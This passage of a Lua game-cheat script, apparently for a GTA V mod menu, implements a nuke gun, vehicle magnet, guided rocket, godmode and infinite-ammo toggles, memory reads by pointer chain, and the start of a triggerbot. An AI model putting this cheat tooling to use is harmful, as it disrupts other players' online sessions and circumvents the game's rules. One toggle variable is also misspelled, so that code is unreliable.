            ---
            local modelHash = ENTITY.GET_ENTITY_MODEL(ent)
            local entity_types = { "No entity", "Ped", "Vehicle", "Object" }
            local entity_type = entity_types[ENTITY.GET_ENTITY_TYPE(ent) + 1]
            if ENTITY.GET_ENTITY_TYPE(ent) == 3 then
                if OBJECT.IS_OBJECT_A_PICKUP(ent) or OBJECT.IS_OBJECT_A_PORTABLE_PICKUP(ent) then
                    entity_type = "Pickup"
                end
            end
            local entity_info = "Hash: " .. modelHash .. " (" .. entity_type .. ")"
            util.toast(entity_info)
            ---
            menu_control_entity = menu.list(entity_control, entity_info, {}, "")
            entity_control_all(menu_control_entity, ent)
            -- ped
            if ENTITY.GET_ENTITY_TYPE(ent) == 1 then
                entity_control_ped(menu_control_entity, ent)
            end
            -- vehicle
            if ENTITY.GET_ENTITY_TYPE(ent) == 2 then
                entity_control_vehicle(menu_control_entity, ent)
            end

            table.insert(control_ent_menu_list, menu_control_entity)
        end
    end
end

function clearcontrollog()
    for k, v in pairs(control_ent_menu_list) do
        if v ~= nil then
            menu.delete(v)
        end
    end
    -- 所有控制的实体
    control_ent_list = {}
    -- 所有控制实体的menu.list
    control_ent_menu_list = {}
end

-------  -------

local function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)

    return destination
end

local function raycast_gameplay_cam(distance)
    local result = {}
    local didHit = memory.alloc(1)
    local endCoords = v3()
    local surfaceNormal = v3()
    local hitEntity = memory.alloc_int()

    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)

    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)

    local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(cam_pos.x, cam_pos.y, cam_pos.z, destination.x, destination.y, destination.z, -1, players.user_ped(), 4)
    SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, memory.addrof(endCoords), memory.addrof(surfaceNormal), hitEntity)

    result.didHit = memory.read_byte(didHit) ~= 0
    result.endCoords = endCoords
    result.surfaceNormal = surfaceNormal
    result.hitEntity = memory.read_int(hitEntity)
    return result
end

local function direction(offset)
    local c1 = get_offset_from_gameplay_camera(offset or 5)
    local res = raycast_gameplay_cam(1000)
    local c2

    if res.didHit then
        c2 = res.endCoords
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end
    c2:sub(c1)
    c2:mul(1000)

    return c2, c1
end


local remove_projectiles = false
local function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end

local launcherThrowable = util.joaat('weapon_grenade')
local throwables_launcher
function throwablebullet(toggle)
    throwables_launcher = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1568386805 then --if holding grenade launcher
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1568386805)
                end
                util.create_thread(function()
                    local currentWeapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
                    local pos1 = ENTITY.GET_ENTITY_BONE_POSTION(currentWeapon, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(currentWeapon, 'gun_muzzle'))
                    local pos2 = get_offset_from_gameplay_camera(30)
                    if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), launcherThrowable, false) then
                        WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), launcherThrowable, 9999, false, false)
                    end
                    util.yield()
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, 200, true, launcherThrowable, players.user_ped(), true, false, 2000.0)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return throwables_launcher
    end)
end

    local function pairsByKeys(t, f)
        local a = {}
        for n in pairs(t) do table.insert(a, n) end
        table.sort(a, f)
        local i = 0
        local iter = function()
            i += 1
            if a[i] == nil then return nil
            else return a[i], t[a[i]]
            end
        end
        return iter
    end

function getLabelTableFromKeys(keyTable)
    local labelTable = {}
    for k, v in pairsByKeys(keyTable) do
        table.insert(labelTable, {k})
    end
    return labelTable
end

function bulletset(text)
    launcherThrowable = throwablesTable[text]
end


function menu.mutually_exclusive_toggle(root, name, commands, help, exclusive_toggles, func)
    local this_toggle
    this_toggle = menu.toggle(root, name, commands, help, function(toggle)
        if toggle then
            for _, ref in pairs(exclusive_toggles) do
                if ref != this_toggle and menu.get_value(ref) then
                    menu.set_value(ref, false)
                end
            end
        end
        func(toggle)
    end)
    return this_toggle
end

local function executeNuke(pos)
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end

mutually_exclusive_weapons  = {}
local nuke_gun_option
function nukegunmode(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1312131151 then --if holding homing launcher
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1312131151)
                end
                util.create_thread(function()
                    local hash = util.joaat('w_arena_airmissile_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        util.yield()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end

local function get_waypoint_v3()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)

        local success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
        local tries = 0
        while not success or tries <= 100 do
            success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
            tries += 1
            util.yield()
        end
        if success then
            waypoint_pos.z = Zcoord
        end

        return waypoint_pos
    else
        util.toast('没有设置标记点')
    end
end

function nukepoint()
    local waypointPos = get_waypoint_v3()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        loadModel(hash)

        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            util.yield()
        end
        entities.delete_by_handle(bomb)
        executeNuke(waypointPos)
    end
end

nuke_height = 40
function nukeheight(value)
    nuke_height = value
end

local impactCords = v3.new()
local blocks = {}
function xxxminecraftgun()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), impactCords) then
        local hash = util.joaat('prop_mb_sandblock_01')
        loadModel(hash)
        blocks[#blocks + 1] = entities.create_object(hash, impactCords)
    end
end

function deleminecraftlastblock()
    if blocks[#blocks] != nil then
        entities.delete_by_handle(blocks[#blocks])
        blocks[#blocks] = nil
    end
end

function deleallblock()
    for i = 1, #blocks do
        entities.delete_by_handle(blocks[i])
        blocks[i] = nil
    end
end

local flameThrower = {
    colour = mildOrangeFire
}

function flamegun()
    if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) != 1119849093 or not JSkey.is_control_pressed(2, 'INPUT_AIM') then
        if not flameThrower.ptfx then return end

        GRAPHICS.REMOVE_PARTICLE_FX(flameThrower.ptfx, true)
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        flameThrower.ptfx = nil
        return
    end

    PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), true)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
        STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        util.yield()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
    if flameThrower.ptfx == nil then
        flameThrower.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped()), 0.8, 0, 0, 0, 0, 270, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped()), 'Gun_Nuzzle'), 0.5, false, false, false)
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(flameThrower.ptfx, flameThrower.colour.r, flameThrower.colour.g, flameThrower.colour.b)
    end
end

function get_offset_from_cam(dist)
	local rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
	local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local dir = rot:toDir()
	dir:mul(dist)
	local offset = v3.new(pos)
	offset:add(dir)
	return offset
end

function get_vehicles_in_player_range(player, radius)
	local vehicles = {}
	local pos = players.get_position(player)
	for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
		local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
		if pos:distance(vehPos) <= radius then table.insert(vehicles, vehicle) end
	end
	return vehicles
end

local ShootEffect =
{
    scale = 0,
	rotation = nil
}
ShootEffect.__index = ShootEffect
setmetatable(ShootEffect, Effect)

function ShootEffect.new(asset, name, scale, rotation)
	tbl = setmetatable({}, ShootEffect)
	tbl.name = name
	tbl.asset = asset
	tbl.scale = scale or 1.0
	tbl.rotation = rotation or v3.new()
	return tbl
end

---@type ShootEffect[]
local shootingEffects <const> = {
	ShootEffect.new("scr_rcbarry2", "muz_clown", 0.8, v3.new(90, 0.0, 0.0)),
	ShootEffect.new("scr_rcbarry2", "scr_clown_bul", 0.3, v3.new(180.0, 0.0, 0.0))
}

function shootingeffect()
	local effect = shootingEffects[selectedOpt]
	if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)

	elseif PED.IS_PED_SHOOTING(players.user_ped()) then
		local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), 0)
		local boneId = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
			effect.name,
			weapon,
			0.0, 0.0, 0.0,
			effect.rotation.x, effect.rotation.y, effect.rotation.z,
			boneId,
			effect.scale,
			false, false, false
		)
	end
end

function setshootingeffect(index)
    selectedOpt = index
end

local colour <const> = {r = 0, g = 255, b = 255, a = 255}

local function draw_marker(type, pos, scale, colour, textureDict, textureName)
	textureDict = textureDict or 0
	textureName = textureName or 0
	GRAPHICS.DRAW_MARKER(
		type,
		pos.x, pos.y, pos.z,
		0.0, 0.0, 0.0,
		0.0, 0.0, 0.0,
		scale, scale, scale,
		colour.r, colour.g, colour.b, colour.a,
		false, false, 0, true, textureDict, textureName, false
	)
end

local function rainbow_colour(colour)
	if colour.r > 0 and colour.b == 0 then
		colour.r = colour.r - 1
		colour.g = colour.g + 1
	end

	if colour.g > 0 and colour.r == 0 then
		colour.g = colour.g - 1
		colour.b = colour.b + 1
	end

	if colour.b > 0 and colour.g == 0 then
		colour.r = colour.r + 1
		colour.b = colour.b - 1
	end
end

function magnetgun()
    if not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then return end
	local numVehicles = 0
	local offset = get_offset_from_cam(30.0)
	local vehicles <const> = get_vehicles_in_player_range(players.user(), 70.0)
    rainbow_colour(colour)
    draw_marker(28, offset, 0.4, colour)

	for _, vehicle in ipairs(vehicles) do
		if PED.GET_VEHICLE_PED_IS_USING(players.user_ped()) ~= vehicle and
		numVehicles < 20 and request_control_once(vehicle) then
			numVehicles = numVehicles + 1
			local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
			local vect = v3.new(offset)
			vect:sub(vehiclePos)
			if selectedOpt == 1 then
				ENTITY.SET_ENTITY_VELOCITY(vehicle, vect.x,vect.y,vect.z)

			elseif selectedOpt == 2 then
				vect:mul(0.5)
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, vect.x,vect.y,vect.z, 0.0, 0.0, 0.5, 0, false, false, true, false, false)
			end
		end
	end
end

function setmagnetgun(index)
    selectedOpt = index
end

local thermal_command = menu.ref_by_path('Game>Rendering>Thermal Vision')
function thermalgun()
    local aiming = PLAYER.IS_PLAYER_FREE_AIMING(players.user())
    if GRAPHICS.GET_USINGSEETHROUGH() and not aiming then
        menu.trigger_command(thermal_command,'off')
        GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1)
    elseif PAD.IS_CONTROL_JUST_PRESSED(38,38) then
        if menu.get_value(thermal_command) or not aiming then
            menu.trigger_command(thermal_command,"off")
            GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1)
        else
            menu.trigger_command(thermal_command,"on")
            GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(50)
        end
    end
end

function supeerrunning()
    local is_performing_action = PED.IS_PED_PERFORMING_MELEE_ACTION(PLAYER.PLAYER_PED_ID())
	if is_performing_action then
        menu.trigger_commands("godmode on")
        menu.trigger_commands("grace on")
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
		FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 29, 25.0, false, true, 0.0, true)
		AUDIO.PLAY_SOUND_FRONTEND(-1, "EMP_Blast", "DLC_HEISTS_BIOLAB_FINALE_SOUNDS", false)
    else
        menu.trigger_commands("godmode off")
	end
end

function runreload()
    if TASK.GET_IS_TASK_ACTIVE(PLAYER.PLAYER_PED_ID(), 4) and PAD.IS_CONTROL_PRESSED(2, 22) and not PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        --checking if player is rolling
        util.yield(900)
        WEAPON.REFILL_AMMO_INSTANTLY(PLAYER.PLAYER_PED_ID())
    end
end

function unlimitedbullet(toggle)
    isInfiniteAmmo = toggle

    while isInfiniteAmmo do
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(PLAYER.PLAYER_PED_ID(), true)
        util.yield()
    end

    if not isInfiniteAmmo then
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(PLAYER.PLAYER_PED_ID(), false)
    end
end

function lockthebullet()
    local curWeaponMem = memory.alloc()
    local junk = WEAPON.GET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), curWeaponMem, 1)
    local curWeapon = memory.read_int(curWeaponMem)
    memory.free(curWeaponMem)

    local curAmmoMem = memory.alloc()
    junk = WEAPON.GET_MAX_AMMO(PLAYER.PLAYER_PED_ID(), curWeapon, curAmmoMem)
    local curAmmoMax = memory.read_int(curAmmoMem)
    memory.free(curAmmoMem)

    if curAmmoMax then
        WEAPON.SET_PED_AMMO(PLAYER.PLAYER_PED_ID(), curWeapon, curAmmoMax)
    end
end

function airstgun()
    local hash <const> = util.joaat("weapon_airstrike_rocket")
	WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	local raycastResult = get_raycast_result(1000.0)
	if raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local pos = raycastResult.endCoords
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			pos.x, pos.y, pos.z + 35.0,
			pos.x, pos.y, pos.z,
			200,
			true,
			hash,
			players.user_ped(), true, false, 2500.0)
	end
end

local function get_time_between_shots()
	local CPed = entities.handle_to_pointer(players.user_ped())
	local addr = addr_from_pointer_chain(CPed, {0x10B8, 0x20, 0x013C})
	return addr ~= 0 and memory.read_float(addr) * 1000 or -1.0
end

function bulletchanger()
    local localPed = players.user_ped()
	if not WEAPON.IS_PED_ARMED(localPed, 4) then
		return
	end

	local selectedBullet = util.joaat(weaponbulletModels[selectedOpt])
	if not WEAPON.HAS_WEAPON_ASSET_LOADED(selectedBullet) then
		WEAPON.REQUEST_WEAPON_ASSET(selectedBullet, 31, 26)
		WEAPON.GIVE_WEAPON_TO_PED(localPed, selectedBullet, 200, false, false)
	end

	PLAYER.DISABLE_PLAYER_FIRING(players.user(), true)
	if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
	PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and timer.elapsed() > math.max(get_time_between_shots(), 80.0) then
		local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(localPed, false)
		local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		local bonePos = ENTITY.GET_ENTITY_BONE_POSTION(weapon, bone)
		local offset = get_offset_from_cam(30.0)

		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			bonePos.x, bonePos.y, bonePos.z,
			offset.x, offset.y, offset.z,
			200,
			true,
			selectedBullet,
			localPed, true, false, 2000.0
		)
		PAD.SET_CONTROL_SHAKE(0, 50, 100)
		timer.reset()

	elseif PAD.IS_DISABLED_CONTROL_JUST_RELEASED(0, 24) then
		PAD.STOP_CONTROL_SHAKE(0)
	end
end

function bulletchanger_set(opt)
    selectedOpt = opt
end

local HitEffect = {colorCanChange = false}
HitEffect.__index = HitEffect
setmetatable(HitEffect, Effect)

function HitEffect.new(asset, name, colorCanChange)
	local inst = setmetatable({}, HitEffect)
	inst.name = name
	inst.asset = asset
	inst.colorCanChange = colorCanChange or false
	return inst
end

local hitEffects <const> = {
	HitEffect.new("scr_rcbarry2", "scr_exp_clown"),
	HitEffect.new("scr_rcbarry2", "scr_clown_appears"),
	HitEffect.new("scr_rcpaparazzo1", "scr_mich4_firework_trailburst_spawn", true),
	HitEffect.new("scr_indep_fireworks", "scr_indep_firework_starburst", true),
	HitEffect.new("scr_indep_fireworks", "scr_indep_firework_fountain", true),
	HitEffect.new("scr_rcbarry1", "scr_alien_disintegrate"),
	HitEffect.new("scr_rcbarry2", "scr_clown_bul"),
	HitEffect.new("proj_indep_firework", "scr_indep_firework_grd_burst"),
	HitEffect.new("scr_rcbarry2", "muz_clown"),
}
hiteffectchinese = {
	{"小丑爆炸"},
	{"小丑出现"},
	{"开拓者FW"},
	{"星爆FW"},
	{"喷泉FW"},
	{"外星解体"},
	{"小丑花"},
	{"地面冲击波FW"},
	{"小丑木兹"},
}

effectColour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}

function hittingeffect()
    local effect = hitEffects[selectedOpt]
	if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		return STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
	end

	local hitCoords = v3.new()
	if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), memory.addrof(hitCoords)) then
		local raycastResult = get_raycast_result(1000.0)
		local rot = raycastResult.surfaceNormal:toRot()
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)

		if effect.colorCanChange then
			local colour = effectColour
			GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		end
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
			effect.name, hitCoords.x,hitCoords.y,hitCoords.z, rot.x - 90.0, rot.y, rot.z, 1.0, false, false, false, false)
	end
end

function sethiteffect(opt)
    selectedOpt = opt
end

function friendshipgun(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false)
end

function get_entity_player_is_aiming_at(player)
	if not PLAYER.IS_PLAYER_FREE_AIMING(player) then
		return NULL
	end
	local entity, pEntity = NULL, memory.alloc_int()
	if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(player, pEntity) then
		entity = memory.read_int(pEntity)
	end
	if entity ~= NULL and ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity, false) then
		entity = PED.GET_VEHICLE_PED_IS_IN(entity, false)
	end
	return entity
end

EntityPair = {ent1 = 0, ent2 = 0}
EntityPair.__index = EntityPair

---@param ent1 Entity
---@param ent2 Entity
---@return EntityPair
function EntityPair.new(ent1, ent2)
	local instance = setmetatable({}, EntityPair)
	instance.ent1 = ent1
	instance.ent2 = ent2
	return instance
end

EntityPair.__eq = function (a, b)
	return a.ent1 == b.ent1 and a.ent2 == b.ent2
end

---@return boolean
function EntityPair:exists()
	return ENTITY.DOES_ENTITY_EXIST(self.ent1) and ENTITY.DOES_ENTITY_EXIST(self.ent2)
end

---@param ent Entity
---@param force Vector3
---@param flag? integer
local apply_force_to_ent = function (ent, force, flag)
	if ENTITY.IS_ENTITY_A_PED(ent) then
		if PED.IS_PED_A_PLAYER(ent) then return end
		PED.SET_PED_TO_RAGDOLL(ent, 1000, 1000, 0, false, false, false)
	end
	if request_control_once(ent) then
		ENTITY.APPLY_FORCE_TO_ENTITY(ent, flag or 1, force.x, force.y, force.z, 0.0, 0.0, 0.0, 0, false, false, true, false, false)
	end
end

function EntityPair:attract()
	local pos1 = ENTITY.GET_ENTITY_COORDS(self.ent1, false)
	local pos2 = ENTITY.GET_ENTITY_COORDS(self.ent2, false)
	local force = v3.new(pos2)
	force:sub(pos1)
	force:mul(0.05)
	apply_force_to_ent(self.ent1, force)
	force:mul(-1)
	apply_force_to_ent(self.ent2, force)
end

local shotEntities = {}

local entityPairs = {}
function magnetents()
    local entity = get_entity_player_is_aiming_at(players.user())
	if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
		draw_bounding_box(entity, true, {r = 255, g = 255, b = 255, a = 81})

		if PED.IS_PED_SHOOTING(players.user_ped()) and
		not (shotEntities[1] and shotEntities[1] == entity) then
			counter = counter + 1
			shotEntities[counter] = entity
		end

		if counter == 2 then
			local entPair = EntityPair.new(table.unpack(shotEntities))
			table.insert_once(entityPairs, entPair)
			counter = 0
			shotEntities = {}
		end
	end

	for i = #entityPairs, 1, -1 do
		local entPair = entityPairs[i]
		if entPair:exists() then entPair:attract() else table.remove(entityPairs, i) end
	end
end

function ROTATION_TO_DIRECTION(rotation) --https://forum.cfx.re/t/get-position-where-player-is-aiming/1903886/2
	local adjusted_rotation = 
	{ 
		x = (math.pi / 180) * rotation.x, 
		y = (math.pi / 180) * rotation.y, 
		z = (math.pi / 180) * rotation.z 
	}
	local direction = 
	{
		x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		z =  math.sin(adjusted_rotation.x)
	}
	return direction
end

function incr(ptr, fvalue, delta)
    local cvalue = memory.read_float(ptr) 
    local delta = math.abs(delta)
	
	if cvalue ~= fvalue then
    	if cvalue > fvalue then 
			delta = -delta 
		end
		
    	if math.abs(fvalue - cvalue) > delta then
    	    cvalue = cvalue + delta
    	else  
    	    cvalue = fvalue
    	end
	end
    
    memory.write_float(ptr, cvalue)
end
--女武神火箭
function rocketgo(toggle)
    local alloc = memory.alloc
    local getTime = util.current_time_millis
	valkyire_rocket = toggle

	if valkyire_rocket then
		local rocket, cam
		local g = alloc()
		local bar = alloc(); 
		local init
		local sTime
		local draw_rect = function(x, y, z, w)
			GRAPHICS.DRAW_RECT(x, y, z, w, 255, 255, 255, 255)
		end
	
		while valkyire_rocket do
			wait()

			if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
				if not init then init = true end
				sTime = getTime()
			end

			if init then
				if not ENTITY.DOES_ENTITY_EXIST(rocket) then
					local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID())
					local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(weapon, 0.0, 1.0, 0.0)
					rocket =  entities.create_object(util.joaat('w_lr_rpg_rocket'), c)
					CAM.DESTROY_ALL_CAMS(true)
					cam = CAM.CREATE_CAM('DEFAULT_SCRIPTED_CAMERA', true)
					CAM.ATTACH_CAM_TO_ENTITY(cam, rocket, 0.0, 0.0, 0.0, true)
					CAM.RENDER_SCRIPT_CAMS(true, true, 700, true, true)
					CAM.SET_CAM_ACTIVE(cam, true)
					ENTITY.SET_ENTITY_VISIBLE(rocket, 0)
					memory.write_float(bar, 0.5); memory.write_float(g, 255)
				else
					local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
					CAM.SET_CAM_ROT(cam, rot.x, rot.y, rot.z, 0)
					ENTITY.SET_ENTITY_ROTATION(rocket, rot.x, rot.y, rot.z, 0, 1)

					local c = vect.add(ENTITY.GET_ENTITY_COORDS(rocket), vect.mult(ROTATION_TO_DIRECTION(CAM.GET_GAMEPLAY_CAM_ROT(0)), 0.8))
					ENTITY.SET_ENTITY_COORDS(rocket, c.x, c.y, c.z, false, false, false, false)
					STREAMING.SET_FOCUS_POS_AND_VEL(c.x, c.y, c.z, 5.0, 0.0, 0.0)

					HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
					PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
					ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
					HUD.HUD_SUPPRESS_WEAPON_WHEEL_RESULTS_THIS_FRAMEN()
					
					draw_rect(0.5, 0.5 - 0.025, 0.050, 0.002)
					draw_rect(0.5, 0.5 + 0.025, 0.050, 0.002)
					draw_rect(0.5 - 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.05, 0.5, 0.050, 0.002)
					draw_rect(0.5 - 0.05, 0.5, 0.050, 0.002)
					draw_rect(0.5, 0.5 + 0.05, 0.002, 0.050)
					draw_rect(0.5, 0.5 - 0.05, 0.002, 0.050)
					GRAPHICS.SET_TIMECYCLE_MODIFIER('CAMERA_secuirity')

					GRAPHICS.DRAW_RECT(0.25, 0.5, 0.03, 0.5, 255, 255, 255, 255)

					if getTime() - sTime >= 100 then
						incr(bar, 0, -0.01); incr(g, 0, -4)
						sTime = getTime()
					end

					GRAPHICS.DRAW_RECT(0.25, 0.75 - (memory.read_float(bar) / 2), 0.03, memory.read_float(bar), 255, round(memory.read_float(g)), 0, 255)

					local groundZ = alloc()
					MISC.GET_GROUND_Z_FOR_3D_COORD(ENTITY.GET_ENTITY_COORDS(rocket).x, ENTITY.GET_ENTITY_COORDS(rocket).y, ENTITY.GET_ENTITY_COORDS(rocket).z, groundZ, 0)
					groundZ = memory.read_float(groundZ)
					
					if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(rocket) or math.abs(ENTITY.GET_ENTITY_COORDS(rocket).z - groundZ) < 0.5 or memory.read_float(bar) <= 0.01 then
						local impact_coord = ENTITY.GET_ENTITY_COORDS(rocket); ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
						FIRE.ADD_EXPLOSION(impact_coord.x, impact_coord.y, impact_coord.z, 32, 1.0, true, false, 0.4)
						entities.delete(rocket)
						rocket = 0
						PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
						STREAMING.CLEAR_FOCUS()
						CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
						CAM.DESTROY_CAM(cam, 1)
						GRAPHICS.SET_TIMECYCLE_MODIFIER('DEFAULT')
						init = false
					end
				end
			end
		end
		GRAPHICS.SET_TIMECYCLE_MODIFIER('DEFAULT')
		STREAMING.CLEAR_FOCUS()
		CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
		CAM.DESTROY_CAM(cam, 1)
		PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
		rocket = 0
		bar = 0.5
		y = 255
		ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
	end
end

--扳机机器人
triggerbot_delay = 100
local ent_alloc = memory.alloc_int()
function trigger(on)
    PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), ent_alloc)
